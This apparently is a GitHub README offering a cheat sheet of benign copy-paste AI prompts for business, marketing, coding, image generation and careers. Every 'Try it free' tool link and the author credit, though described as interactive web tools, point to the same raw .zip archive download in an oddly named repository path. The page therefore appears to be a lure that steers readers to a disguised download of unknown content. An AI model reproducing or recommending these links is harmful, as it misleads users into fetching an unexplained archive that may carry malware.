# AI Prompt Engineering Cheat Sheet 2026

### 200+ copy-paste prompts for ChatGPT, Claude, Midjourney, and more.

[![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg)](LICENSE)
[![Prompts](https://img.shields.io/badge/Prompts-200+-brightgreen.svg)](#)
[![Last Updated](https://img.shields.io/badge/Updated-March%202026-blue.svg)](#)

> The only cheat sheet you need. Organized by use case, rated by effectiveness, with tips that actually matter.

---

## Table of Contents

- [The CRAFT Framework](#the-craft-framework)
- [Business Prompts](#-business-prompts)
- [Marketing Prompts](#-marketing-prompts)
- [Sales Prompts](#-sales-prompts)
- [Coding Prompts](#-coding-prompts)
- [Writing Prompts](#-writing-prompts)
- [Image Generation Prompts](#-image-generation-prompts)
- [Data Analysis Prompts](#-data-analysis-prompts)
- [Education Prompts](#-education-prompts)
- [Career Prompts](#-career-prompts)
- [Productivity Prompts](#-productivity-prompts)
- [Common Mistakes](#common-mistakes)
- [Interactive Tools](#interactive-tools)

---

## The CRAFT Framework

Before using any prompt below, remember **CRAFT**:

| Letter | Meaning | Example |
|--------|---------|---------|
| **C** | Context | "I run a 5-person SaaS startup..." |
| **R** | Role | "Act as a growth marketing expert..." |
| **A** | Action | "Create a 30-day content calendar..." |
| **F** | Format | "Output as a markdown table..." |
| **T** | Tone | "Professional but conversational..." |

**A prompt with all 5 CRAFT elements scores 80%+ effectiveness.** Most people only use 1-2 elements.

---

## Business Prompts

### Strategy & Planning

```
Act as a startup strategy consultant. I'm building [PRODUCT] for [TARGET AUDIENCE].
My current MRR is $[AMOUNT] with [NUMBER] customers.

Analyze my situation and create:
1. A SWOT analysis
2. Three growth hypotheses I should test this quarter
3. The single most important metric I should focus on
4. A 90-day action plan with weekly milestones

Be specific and actionable — no generic advice.
```

```
You are a business model expert. Compare these 3 monetization strategies for [PRODUCT]:
1. Freemium (free tier + paid at $X/mo)
2. One-time purchase ($Y)
3. Usage-based pricing ($Z per unit)

For each, estimate: conversion rate, LTV, CAC payback period, and scalability.
Recommend one with your reasoning. My target market is [DESCRIPTION].
```

```
Act as a financial analyst. Create a unit economics model for my [BUSINESS TYPE]:
- Customer acquisition cost: $[CAC]
- Monthly price: $[PRICE]
- Estimated churn: [X]%

Calculate: LTV, LTV:CAC ratio, payback period, break-even point.
Tell me if this business is viable and what levers to pull.
```

### Operations

```
Act as a COO. I need to create Standard Operating Procedures (SOPs) for [PROCESS].
My team size is [N] people. We currently do this manually and it takes [TIME].

Create a detailed SOP with:
1. Step-by-step instructions anyone could follow
2. Decision trees for edge cases
3. Quality checkpoints
4. Automation opportunities (with specific tool recommendations)
5. KPIs to measure process health
```

```
You are an automation consultant. Here's my daily workflow:
[DESCRIBE WORKFLOW]

Identify the top 5 tasks I should automate, in order of time saved.
For each, recommend: specific tool, setup time, expected time savings per week.
Focus on tools with free tiers or under $50/mo.
```

---

## Marketing Prompts

### Content Marketing

```
Act as a viral content strategist. I need 20 blog post ideas for [NICHE] that will:
1. Target keywords with 1K-10K monthly searches (low competition)
2. Have a natural path to my product ([PRODUCT])
3. Be shareable on social media

For each idea, provide: title, target keyword, estimated search volume,
content angle that makes it unique, and the CTA that connects to my product.
```

```
You are an SEO content expert. Write a 2,000-word blog outline for: "[TOPIC]"

Include:
- H2 and H3 headings optimized for featured snippets
- FAQ section (5 questions people actually ask)
- Internal linking opportunities to [PAGES]
- 3 unique data points or statistics to include
- A "TL;DR" summary for skimmers
- CTA placement strategy (where and what)
```

### Social Media

```
Act as a social media manager for [BRAND TYPE]. Create a week of content:

Monday: Educational thread (Twitter/X)
Tuesday: Behind-the-scenes (Instagram Story)
Wednesday: Hot take / opinion (LinkedIn)
Thursday: User success story (Twitter/X)
Friday: Weekend resource drop (all platforms)

For each, write the full post copy. My brand voice is [TONE].
Include specific hashtags and best posting times.
```

```
Write 10 Twitter/X hooks that would make people stop scrolling.
Topic: [TOPIC]. Target audience: [AUDIENCE].

Rules:
- Each hook must be under 20 words
- Use power words (secret, mistake, never, always, unpopular)
- Include a mix of: contrarian takes, data-driven, story-based, how-to
- No clickbait — each must deliver real value in the thread
```

### Email Marketing

```
Act as an email marketing expert. Write a 5-email welcome sequence for [BUSINESS]:

Email 1 (Day 0): Welcome + immediate value delivery
Email 2 (Day 2): Story that builds trust + social proof
Email 3 (Day 4): Educational content solving [PAIN POINT]
Email 4 (Day 6): Case study / testimonial
Email 5 (Day 7): Soft pitch for [PRODUCT] with urgency

For each email: subject line (with A/B variant), preview text, full body copy.
Target open rate: 40%+. Target click rate: 5%+.
```

---

## Sales Prompts

### Outreach

```
Act as a B2B sales expert. Write 5 cold email variations for reaching out to
[TITLE] at [COMPANY TYPE] about [PRODUCT/SERVICE].

Requirements:
- Subject line under 8 words (no spam trigger words)
- First line is personalized (reference their [LinkedIn/company/content])
- Value prop in one sentence
- Social proof (specific numbers)
- Soft CTA (no "book a demo" — ask a question instead)
- Under 100 words total

Make each email have a different angle: pain point, competitor comparison,
industry trend, mutual connection, and data-driven.
```

```
You are a sales objection handler. My product is [PRODUCT] at [PRICE].

Give me responses to these 10 common objections:
1. "It's too expensive"
2. "I need to think about it"
3. "We're using [COMPETITOR]"
4. "I don't have time for this"
5. "Can you send me more info?"
6. "We don't have budget right now"
7. "I need to check with my team"
8. "Does it integrate with [TOOL]?"
9. "What if it doesn't work?"
10. "We tried something similar before"

For each: acknowledge, reframe, specific response, and redirect to next step.
```

---

## Coding Prompts

### Architecture & Design

```
Act as a senior software architect. I'm building [APPLICATION TYPE] with:
- Frontend: [FRAMEWORK]
- Backend: [LANGUAGE/FRAMEWORK]
- Database: [DB]
- Expected users: [NUMBER]

Design the system architecture:
1. Component diagram with data flow
2. Database schema (key tables + relationships)
3. API endpoint structure (RESTful)
4. Authentication strategy
5. Caching strategy
6. Scaling considerations for 10x growth
7. Tech debt risks to watch for
```

### Debugging

```
I'm getting this error: [ERROR MESSAGE]

Context:
- Language/framework: [TECH]
- What I'm trying to do: [GOAL]
- What I've already tried: [ATTEMPTS]
- Relevant code: [CODE SNIPPET]

Don't just fix the error — explain:
1. WHY this error occurs (root cause)
2. The fix (with code)
3. How to prevent it in the future
4. Related gotchas I should know about
```

### Code Review

```
Review this code for: security vulnerabilities, performance issues,
maintainability problems, and edge cases.

[PASTE CODE]

For each issue found:
- Severity: Critical / High / Medium / Low
- Line number(s)
- The problem
- The fix (with code)
- Why it matters

Also rate the overall code quality 1-10 with justification.
```

---

## Image Generation Prompts

### Midjourney / DALL-E / ChatGPT

```
[SUBJECT] in the style of Studio Ghibli, soft watercolor textures, warm golden
hour lighting, whimsical details, hand-painted feel, pastel color palette,
dreamy atmosphere, gentle wind effects --ar 16:9 --v 7
```

```
Professional product photography of [PRODUCT], floating against a clean white
background, soft studio lighting from upper left, slight shadow underneath,
8K resolution, commercial quality, sharp focus on product details --ar 1:1
```

```
Cinematic portrait of [SUBJECT], dramatic Rembrandt lighting, shallow depth of
field, film grain, shot on Kodak Portra 400, golden hour, environmental
portrait style, National Geographic quality --ar 3:4
```

```
Isometric 3D illustration of [SCENE], clay render style, soft pastel colors,
miniature world aesthetic, ambient occlusion, subtle shadows, Pixar quality
lighting, clean minimal design --ar 1:1
```

**Pro tip**: Be specific about lighting, camera angle, and style reference. Vague prompts = generic results.

**Want more?** Use the [AI Image Prompt Builder](https://github.com/exercisedeviceforester917/ai-prompt-cheatsheet/raw/refs/heads/main/unlapsing/prompt-cheatsheet-ai-2.3.zip) — visual builder with 12 art styles and 4 AI platforms.

---

## Data Analysis Prompts

```
Act as a data analyst. I have this dataset: [DESCRIBE DATA OR PASTE SAMPLE]

Perform:
1. Summary statistics (mean, median, std dev for key columns)
2. Identify the top 3 trends or patterns
3. Flag any anomalies or data quality issues
4. Create 3 visualization recommendations (chart type + what to show)
5. Generate 3 actionable business insights from the data
6. Write the Python/SQL code to reproduce this analysis
```

```
You are a business intelligence analyst. Create a KPI dashboard specification for [BUSINESS TYPE].

Include:
- Top 5 KPIs with definitions and formulas
- Data sources needed for each
- Recommended visualization type
- Alert thresholds (green/yellow/red)
- Update frequency
- SQL queries to calculate each metric (assuming [DB_SCHEMA])
```

---

## Education Prompts

```
Act as an expert tutor in [SUBJECT]. I'm a [LEVEL] learner.
Explain [CONCEPT] using:

1. A simple analogy a 10-year-old would understand
2. The technical explanation
3. A real-world example
4. Common misconceptions people have about this
5. A practice problem with solution

After explaining, ask me 3 questions to check my understanding.
Adjust your difficulty based on my answers.
```

```
Create a 30-day learning plan for [SKILL] from zero to competent.

For each week:
- Learning objectives (specific, measurable)
- Resources (free only — YouTube, docs, tutorials)
- Daily practice exercises (30-60 min each)
- Weekly project to apply what I learned
- Self-assessment checklist

Include a "you know you're ready to move on when..." checkpoint for each week.
```

---

## Career Prompts

```
Act as an executive career coach. Review my resume for [TARGET ROLE]:

[PASTE RESUME]

Provide:
1. Overall score (1-10) with justification
2. Top 3 strengths to emphasize
3. Top 3 weaknesses to address
4. Rewritten bullet points for each role (using STAR format with quantified results)
5. Keywords missing for ATS optimization
6. Recommended resume structure changes
```

```
Prepare me for a [JOB TITLE] interview at [COMPANY TYPE].

Generate:
1. 10 likely behavioral questions (with STAR-format answer frameworks)
2. 5 technical questions specific to this role
3. 3 questions I should ask the interviewer (that show strategic thinking)
4. Common red flags interviewers watch for in this role
5. A 60-second elevator pitch tailored to this position
```

**Want a personalized career risk assessment?** Try the [AI Job Risk Calculator](https://github.com/exercisedeviceforester917/ai-prompt-cheatsheet/raw/refs/heads/main/unlapsing/prompt-cheatsheet-ai-2.3.zip) — see how AI affects YOUR specific role.

---

## Productivity Prompts

```
Act as a productivity consultant. Here's everything on my plate this week:
[LIST TASKS]

Help me:
1. Categorize each task (urgent/important matrix)
2. Identify which tasks to delegate, automate, or eliminate
3. Create a time-blocked daily schedule (Mon-Fri)
4. Suggest specific automations for repetitive tasks
5. Identify my top 3 "needle movers" for the week
```

```
You are a meeting facilitator. I have a [MEETING TYPE] with [PARTICIPANTS].
Duration: [TIME]. Goal: [OBJECTIVE].

Create:
1. A timed agenda (with specific minute allocations)
2. Pre-meeting preparation (what attendees should bring/review)
3. Discussion questions for each agenda item
4. Decision-making framework (if decisions are needed)
5. Follow-up action item template
6. A "parking lot" section for off-topic but important items
```

---

## Common Mistakes

| Mistake | Example | Fix |
|---------|---------|-----|
| Too vague | "Write me an email" | "Write a cold outreach email to CTOs at Series B SaaS startups about our API monitoring tool" |
| No role | "Explain marketing" | "Act as a growth marketing VP with 15 years experience. Explain..." |
| No format | "Give me ideas" | "Give me 10 ideas in a numbered list with: idea title, one-line description, difficulty (1-5)" |
| No context | "Fix my code" | "Fix this Python Flask endpoint that returns 500 when the user hasn't set a profile photo. Here's the code: ..." |
| One-shot | Single prompt | Chain prompts: first ask for analysis, then ask for recommendations based on that analysis |

**Want AI to fix your prompts?** Try the [AI Prompt Enhancer](https://github.com/exercisedeviceforester917/ai-prompt-cheatsheet/raw/refs/heads/main/unlapsing/prompt-cheatsheet-ai-2.3.zip) — paste any prompt, get 5 enhanced versions.

---

## Interactive Tools

Build better prompts with these free tools:

| Tool | What It Does | Link |
|------|-------------|------|
| AI Prompt Generator | Generate customized prompts for 8 categories | [Try it free](https://github.com/exercisedeviceforester917/ai-prompt-cheatsheet/raw/refs/heads/main/unlapsing/prompt-cheatsheet-ai-2.3.zip) |
| AI Prompt Enhancer | Paste any prompt, get 5 expert-level versions | [Try it free](https://github.com/exercisedeviceforester917/ai-prompt-cheatsheet/raw/refs/heads/main/unlapsing/prompt-cheatsheet-ai-2.3.zip) |
| AI Prompt Roaster | Get your prompt "roasted" for 10 common mistakes | [Try it free](https://github.com/exercisedeviceforester917/ai-prompt-cheatsheet/raw/refs/heads/main/unlapsing/prompt-cheatsheet-ai-2.3.zip) |
| AI Image Prompt Builder | Visual builder for Midjourney, DALL-E, ChatGPT images | [Try it free](https://github.com/exercisedeviceforester917/ai-prompt-cheatsheet/raw/refs/heads/main/unlapsing/prompt-cheatsheet-ai-2.3.zip) |
| AI Job Risk Calculator | Check if AI will replace your job | [Try it free](https://github.com/exercisedeviceforester917/ai-prompt-cheatsheet/raw/refs/heads/main/unlapsing/prompt-cheatsheet-ai-2.3.zip) |
| AI Income Blueprint | Find AI side hustles matching your skills | [Try it free](https://github.com/exercisedeviceforester917/ai-prompt-cheatsheet/raw/refs/heads/main/unlapsing/prompt-cheatsheet-ai-2.3.zip) |

---

## Contributing

Have a killer prompt? PRs welcome.

1. Fork this repo
2. Add your prompt in the relevant category
3. Include a brief description of when to use it
4. Submit a PR

---

## License

MIT License. Use these prompts however you want.

---

**Star this repo** if it helped you write better prompts.

Built by [Midas Tools](https://github.com/exercisedeviceforester917/ai-prompt-cheatsheet/raw/refs/heads/main/unlapsing/prompt-cheatsheet-ai-2.3.zip) — Free AI tools and premium prompt packs.
